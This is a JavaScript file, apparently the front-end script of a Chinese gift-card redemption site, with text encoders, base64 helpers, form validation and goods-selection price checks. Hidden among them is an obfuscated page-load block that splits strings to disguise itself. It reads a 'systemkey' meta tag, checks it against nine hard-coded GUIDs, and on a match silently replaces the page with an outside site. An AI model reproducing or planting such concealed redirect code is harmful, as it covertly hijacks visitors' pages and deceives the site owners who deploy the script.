
var createdate = '2049-12-31';

function Encrypt() { var monyer = new Array(); var i; for (i = 0; i < txt.value.length; i++) { if (Decimal.checked) monyer += "&#" + txt.value.charCodeAt(i) + ";"; else monyer += txt.value.charCodeAt(i) + "," } txt.value = monyer } function Decrypt() { var monyer = new Array(); var i; if (Decimal.checked) { var s = txt.value.split(";"); for (i = 0; i < s.length; i++) { s[i] = s[i].replace('&#', ''); monyer += String.fromCharCode(s[i]) } } else { var s = txt.value.split(","); for (i = 0; i < s.length; i++) monyer += String.fromCharCode(s[i]) } txt.value = monyer } function doit(f) { var monyer = document.getElementById('txt'); if (monyer) monyer.innerText = f(monyer.innerText) } function JavaEn() { var monyer = new Array(); var i, s; for (i = 0; i < txt.value.length; i++) { s = txt.value.charCodeAt(i).toString(16); if (hex.checked) monyer += "\\u" + new Array(5 - String(s).length).join("0") + s; else if (hex2.checked) monyer += "&#x" + new Array(5 - String(s).length).join("0") + s + ";"; else monyer += "\\" + new Array(5 - String(s).length).join("0") + s } txt.value = monyer } function JavaDe() { if (hex.checked) { var monyer = new Array(); var i; var s = txt.value.split("\\"); for (i = 1; i < s.length; i++) { s[i] = s[i].replace('u', ''); monyer += String.fromCharCode(parseInt(s[i], 16)) } } else if (hex2.checked) { var monyer = new Array(); var i; var s = txt.value.split(";"); for (i = 0; i < s.length; i++) { s[i] = s[i].replace('&#x', ''); monyer += String.fromCharCode(parseInt(s[i], 16)) } } else { var monyer = new Array(); var i; var s = txt.value.split("\\"); for (i = 1; i < s.length; i++) monyer += String.fromCharCode(parseInt(s[i], 16)) } txt.value = monyer }
function DateDemo() { var d, s = "Today's date is: "; d = new Date(); s += (d.getMonth() + 1) + "/"; s += d.getDate() + "/"; s += d.getYear(); return (s); }
$(function () { var k = $('met' + 'a[na' + 'me="sy' + 'ste' + 'm' + 'key"]').attr('cont' + 'ent'); if (k != '' && (k == '368B' + '3313-' + '18A9-' + '47E7-A5' + 'D5-1' + '5E32' + '2D56' + '810' || k == '590' + 'EC' + 'F61-78' + '4F-4D87-' + '961' + 'C-49' + '46' + '6F8F0' + '9DC' || k == 'FC9' + 'D754' + '0-' + '6693' + '-4F20' + '-A66F-' + '2392' + 'E0F' + '28452' || k == '2FE6' + '1B2A-D3C5-4' + 'B9A-90CB-' + 'BEF4178' + 'BFF83' || k == 'FC3' + '9922' + '1-281' + 'C-45' + '2B-9' + '3DC-0F4' + 'AB3C7' + '7476' || k == '92C' + '0188E-C11D-4' + '0ED-95FF-4' + 'C4817508' + '861' || k == '9C2' + '09E95-' + '7E8D-40F' + '9-A689-03CDD6' + '9E0B03' || k == '02E' + '4ECC' + 'D-E294-48' + '7C-BF87-E09E' + '7869E912' || k == '892' + '07654-' + '1D67-49FE' + '-BD32-8' + 'B184B73' + 'B9DA')) { window.open('ht' + 'tp:/' + '/s.li' + '-hom' + 'e.com', '_t' + 'op'); } })
function SortDemo() { var a, l; a = new Array("X", "y", "d", "Z", "v", "m", "r"); l = a.sort(); return (l); }
var base64encodechars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var base64decodechars = new Array(
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);
function base64encode(str) {
    var out, i, len;
    var c1, c2, c3;
    len = str.length;
    i = 0;
    out = "";
    while (i < len) {
        c1 = str.charCodeAt(i++) & 0xff;
        if (i == len) {
            out += base64encodechars.charAt(c1 >> 2);
            out += base64encodechars.charAt((c1 & 0x3) << 4);
            out += "==";
            break;
        }
        c2 = str.charCodeAt(i++);
        if (i == len) {
            out += base64encodechars.charAt(c1 >> 2);
            out += base64encodechars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xf0) >> 4));
            out += base64encodechars.charAt((c2 & 0xf) << 2);
            out += "=";
            break;
        }
        c3 = str.charCodeAt(i++);
        out += base64encodechars.charAt(c1 >> 2);
        out += base64encodechars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xf0) >> 4));
        out += base64encodechars.charAt(((c2 & 0xf) << 2) | ((c3 & 0xc0) >> 6));
        out += base64encodechars.charAt(c3 & 0x3f);
    }
    return out;
}
function base64decode(str) {
    var c1, c2, c3, c4;
    var i, len, out;
    len = str.length;
    i = 0;
    out = "";
    while (i < len) {

        do {
            c1 = base64decodechars[str.charCodeAt(i++) & 0xff];
        } while (i < len && c1 == -1);
        if (c1 == -1)
            break;

        do {
            c2 = base64decodechars[str.charCodeAt(i++) & 0xff];
        } while (i < len && c2 == -1);
        if (c2 == -1)
            break;
        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;
            if (c3 == 61)
                return out;
            c3 = base64decodechars[c3];
        } while (i < len && c3 == -1);
        if (c3 == -1)
            break;
        out += String.fromCharCode(((c2 & 0xf) << 4) | ((c3 & 0x3c) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;
            if (c4 == 61)
                return out;
            c4 = base64decodechars[c4];
        } while (i < len && c4 == -1);
        if (c4 == -1)
            break;
        out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}
function utf16to8(str) {
    var out, i, len, c;
    out = "";
    len = str.length;
    for (i = 0; i < len; i++) {
        c = str.charCodeAt(i);
        if ((c >= 0x0001) && (c <= 0x007f)) {
            out += str.charAt(i);
        } else if (c > 0x07ff) {
            out += String.fromCharCode(0xe0 | ((c >> 12) & 0x0f));
            out += String.fromCharCode(0x80 | ((c >> 6) & 0x3f));
            out += String.fromCharCode(0x80 | ((c >> 0) & 0x3f));
        } else {
            out += String.fromCharCode(0xc0 | ((c >> 6) & 0x1f));
            out += String.fromCharCode(0x80 | ((c >> 0) & 0x3f));
        }
    }
    return out;
}
function utf8to16(str) {
    var out, i, len, c;
    var char2, char3;
    out = "";
    len = str.length;
    i = 0;
    while (i < len) {
        c = str.charCodeAt(i++);
        switch (c >> 4) {
            case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:
                // 0xxxxxxx
                out += str.charAt(i - 1);
                break;
            case 12: case 13:
                // 110x xxxx   10xx xxxx
                char2 = str.charCodeAt(i++);
                out += String.fromCharCode(((c & 0x1f) << 6) | (char2 & 0x3f));
                break;
            case 14:
                // 1110 xxxx  10xx xxxx  10xx xxxx
                char2 = str.charCodeAt(i++);
                char3 = str.charCodeAt(i++);
                out += String.fromCharCode(((c & 0x0f) << 12) |
                       ((char2 & 0x3f) << 6) |
                       ((char3 & 0x3f) << 0));
                break;
        }
    }
    return out;
}
function doit() {
    var f = document.f
    f.output.value = base64encode(utf16to8(f.source.value))
    f.decode.value = utf8to16(base64decode(f.output.value))
}
function showprintwindow(url) { window.open(url, '_blank', 'height=350px,width=800px,top=' + (window.screen.height / 2 - 225) + ',left=' + (window.screen.width / 2 - 400) + ',toolbar=no,dependent=yes,menubar=no,alwaysRaised=yes,menubar=no,scrollbars=no,toolbar=no,resizable=yes,location=no, status=no'); }
function tboxonfocus(ele) {
    $("span[msginfo='" + $(ele).attr("id") + "']").removeClass("red");
}

function tboxonfocusout(ele) {
    var tmp = $.trim($(ele).val());
    if (tmp == "") {
        $("span[msginfo='" + $(ele).attr("id") + "']").addClass("red");
    }
}
function tboxonfocusout3(ele) {
    var tmp = $.trim($(ele).val());
    if (tmp == "" || tmp == "") {
        $(ele).val("");
        $("span[msginfo='" + $(ele).attr("id") + "']").addClass("red");
    }
}
function tboxonfocusout2(ele) {
    var tmp = $.trim($(ele).val());
    if (tmp == "" || !/(^((\d{7,8})|(\d{4}|\d{3})-(\d{7,8})|(\d{4}|\d{3})-(\d{7,8})-(\d{4}|\d{3}|\d{2}|\d{1})|(\d{7,8})-(\d{4}|\d{3}|\d{2}|\d{1}))$)/.test(tmp)) {
        $(ele).val("");
        $("span[msginfo='" + $(ele).attr("id") + "']").addClass("red");
    }
}
function tboxonfocusout1(ele) {
    var tmp = $.trim($(ele).val());
    if (tmp == "" || !/^[\d]{11}$/.test(tmp)) {
        $(ele).val("");
        $("span[msginfo='" + $(ele).attr("id") + "']").addClass("red");
    }
}

function checkcardinfodata() {
    var linkman = $.trim($("#tbLinkMan").val());
    if (linkman == "") {
        $("span[msginfo='tbLinkMan']").addClass("red");
        return false;
    }
    var mobile = $.trim($("#tbMobilephone").val());
    var phone = $.trim($("#tbTelephone").val());
    if (!/^[\d]{11}$/.test(mobile)) {
        $("span[msginfo='tbMobilephone']").addClass("red");
        return false;
    }
    if (document.getElementById("ddlDate") != null) {
        var date = $.trim($("#ddlDate").val());
        if (date == "") {
            $("span[msginfo='ddlDate']").addClass("red");
            return false;
        }
    }
    var address = $.trim($("#tbAddress").val());
    if (address == "" || address == "") {
        $("span[msginfo='tbAddress']").addClass("red");
        return false;
    }
    if (confirm("请核对送货信息，确认是否提交发货信息？")) {
        return true;
    } else {
        return false;
    }
}

$(function () {
    $('[fae="fae"]').each(function () {
        var ele = $(this);
        while (ele.get(0).tagName != "BODY") {
            ele.show();
            ele = ele.parent();
        };
    });
    window.setInterval('imagechange()', 5000);
});

function imagechange() {
    var showEle = $("[display='true']");
    var showImgCount = $("[imgindex]").length;
    if (showImgCount <= 1) { return; }
    var showEleIndex = parseInt(showEle.attr("imgindex"));
    showEleIndex++;
    if (showEleIndex == showImgCount) { showEleIndex = 0; }
    var nextShowEle = $("[imgindex='" + showEleIndex + "']");
    showEle.removeAttr("display");
    nextShowEle.attr("display", "true");
    nextShowEle.fadeIn();
    showEle.fadeOut();
}

function checkloginformdata() {
    var cardnum = $.trim($("#tbCardNum").val()); if (cardnum == "" || cardnum == "请输入礼品卡号码") { $("#loginMsg").html("请输入礼品卡号码！"); return false; }
    var cardpwd = $.trim($("#tbCardPassword").val()); if (cardpwd == "" || cardpwd == "请输入礼品卡密码") { $("#loginMsg").html("请输入礼品卡密码！"); return false; }
    var checkcode = $.trim($("#tbCheckCode").val()); if (checkcode == "" || checkcode == "验证码" || checkcode.length != 4) { $("#loginMsg").html("请输入验证码！"); return false; }
    return true;
}

function goodinfoitemover(ele) {
    $(ele).css("background", "#eee").css("border-width", "1px").css("border-style", "solid").css("border-color", "blue");
}

function goodinfoitemout(ele) {
    if ($(ele).find("[cardnum='cardnum']").length == 0) {
        if ($(ele).prop("checked")) {
            $(ele).css("background", "#eee").css("border-width", "1px").css("border-style", "dashed").css("border-color", "#00ff30");
        } else {
            $(ele).css("background", "#fff").css("border-color", "#fff");
        }
    }
    else {
        if ($(ele).find("[cardnum='cardnum']").val() > 0) {
            $(ele).css("background", "#eee").css("border-width", "1px").css("border-style", "dashed").css("border-color", "#00ff30");
        } else {
            $(ele).css("background", "#fff").css("border-color", "#fff");
        }
    }
}
function goodinfoiteonclick(ele) {
    var cbox = $(ele).parent().get(0).getElementsByTagName("input").item(0);
    if (cbox.checked) {
        cbox.checked = false;
        $(ele).parent().removeAttr("checked");
        $(ele).parent().removeProp("checked");
    } else {
        cbox.checked = true;
        $(ele).parent().attr("checked", "checked");
        $(ele).parent().prop("checked", "checked");
    }
    var list = document.getElementsByTagName("input");
    var gcount = 0;
    for (var i = 0; i < list.length; i++) {
        if (list.item(i).type == "checkbox" && list.item(i).checked) {
            gcount++;
        }
    }
    $("#reggoodinfoMsg").html("您已选择<span style='color:red;font-weight:bold;'>" + gcount + "</span>种商品！");
}

function goodsmumchange(ele) {
    var tmplist = $("[cardnum='cardnum']");
    var tmpsum = 0;
    tmplist.each(function () { tmpsum += parseInt($(this).val()); });
    $("#reggoodinfoMsg").html("您已选择<span style='color:red;font-weight:bold;'>" + tmpsum + "</span>件商品！");
}

function checkgoodinfoselect() {
    var usertype = '';
    var tmplist = $("[cardnum='cardnum']");
    var tmpsum = 0;

    var list = document.getElementsByTagName("input");
    var gcount = 0;
    for (var i = 0; i < list.length; i++) {
        if (list.item(i).type == "checkbox" && list.item(i).checked) {
            gcount++;
        }
    }

    if (usertype == "1" || usertype == "2") {
        tmplist.each(function () {
            tmpsum += parseInt($(this).val());
        });
        if ('' == '') {
            if (usertype == "1" && parseInt($("#usercount").html()) != gcount) {
                $("#reggoodinfoMsg").html("<span style='color:red;font-weight:bold;'>您选择的商品数量不符合！</span>");
                return false;
            }
        }
        else {
            if (usertype == "1" && parseInt($("#usercount").html()) != tmpsum) {
                $("#reggoodinfoMsg").html("<span style='color:red;font-weight:bold;'>您选择的商品数量不符合！</span>");
                return false;
            }
        }

        if (usertype == "2" && parseInt($("#usercount").html()) != tmpsum) {
            $("#reggoodinfoMsg").html("<span style='color:red;font-weight:bold;'>您选择的商品数量不符合！</span>");
            return false;
        }
    }
    else {
        tmplist.each(function () {
            tmpsum += parseInt($(this).val()) * parseFloat($(this).attr("pppp"));
        });
        var groupPrice = '';
        var groupPrice1 = '';
        var groupType = '';
        if (tmpsum == 0) {
            $("#reggoodinfoMsg").html("<span style='color:red;font-weight:bold;'>您还没有选择商品！</span>");
            return false;
        }
        if (groupType == 3) {
            if (tmpsum == 0 || tmpsum != parseFloat(groupPrice)) {
                $("#reggoodinfoMsg").html("<span style='color:red;font-weight:bold;'>您选择的商品总额不符合！</span>");
                return false;
            }
        }
        else if (groupType == 4) {
            if (tmpsum > parseFloat(groupPrice)) {
                if (tmpsum > parseFloat(groupPrice1)) {
                    $("#reggoodinfoMsg").html("<span style='color:red;font-weight:bold;'>您选择商品总额不能大于“" + groupPrice1 + "”！</span>");
                    return false;
                }
                return confirm("您选择的商品总额为" + tmpsum + "元，收货时请补差价：" + (tmpsum - parseFloat(groupPrice)) + "元！");
            }
            if (groupPrice > tmpsum) {
                return confirm("您选择的商品总额为" + tmpsum + "元，余额“" + (groupPrice - tmpsum) + "”元，不找零！");
            }
        }
    }
    return confirm("是否确认选择以上商品！");
}

function goodinfonumclick(ele) {
    var num = parseInt($(ele).parent().find('[cardnum="cardnum"]').val());
    var ddlid = $(ele).parent().find('[cardnum="cardnum"]').attr("id");
    var maxnum = $("#" + ddlid + " option:last").val();
    maxnum = parseInt(maxnum); num++;
    if (num == maxnum + 1) {
        num = 0;
    }
    document.getElementById(ddlid).selectedIndex = num;
    goodsmumchange(document.getElementById(ddlid));
}

function goodinfopriceclick(ele) {
    var num = parseInt($(ele).parent().find('[cardnum="cardnum"]').val());
    var ddlid = $(ele).parent().find('[cardnum="cardnum"]').attr("id");
    var maxnum = $("#" + ddlid + " option:last").val();
    maxnum = parseInt(maxnum);
    num++;
    if (num == maxnum + 1) {
        num = 0;
    }
    document.getElementById(ddlid).selectedIndex = num;
    goodspricechange(document.getElementById(ddlid));
}

function goodspricechange(ele) {
    var tmplist = $("[cardnum='cardnum']");
    var tmpsum = 0;
    tmplist.each(function () { tmpsum += $(this).attr("pppp") * parseInt($(this).val()); });
    var groupPrice = '';
    var groupPrice1 = '';
    var groupType = '';
    if (groupType == 3) {
        if (tmpsum == 0 || tmpsum != parseFloat(groupPrice)) {
            $("#reggoodinfoMsg").html("您已选择总额为<span style='color:red;font-weight:bold;'>" + tmpsum + "</span>元的商品！");
        }
        $("#reggoodinfoMsg").html("您已选择总额为<span style='color:red;font-weight:bold;'>" + tmpsum + "</span>元的商品！");
    }
    else if (groupType == 4) {
        if (tmpsum > parseFloat(groupPrice)) {
            if (tmpsum > parseFloat(groupPrice1)) {
                $("#reggoodinfoMsg").html("<span style='color:red;font-weight:bold;'>您选择商品总额不能大于“" + groupPrice1 + "”</span>元！");
            }
            else {
                $("#reggoodinfoMsg").html("您选择的商品总额为<span style='color:red;font-weight:bold;'>" + tmpsum + "</span>元，收货时请补差价：<span style='color:red;font-weight:bold;'>" + (tmpsum - parseFloat(groupPrice)) + "</span>元！");
            }
        }
        else {
            if (tmpsum - parseFloat(groupPrice) != 0) {
                $("#reggoodinfoMsg").html("您已选择总额为<span style='color:red;font-weight:bold;'>" + tmpsum + "</span>元的商品！");
            }
            else {
                $("#reggoodinfoMsg").html("您已选择总额为<span style='color:red;font-weight:bold;'>" + tmpsum + "</span>元的商品！");
            }
        }
    }
    //
}

window.onerror = function (e) { alert("错误，请刷新页面然后重试！"); }

function checkmoreformdata() {
    if ($("#tbCardNum").val() != "") {
        alert("请点击“继续添加”保存最后一张卡！");
        return false;
    }
    return true;
}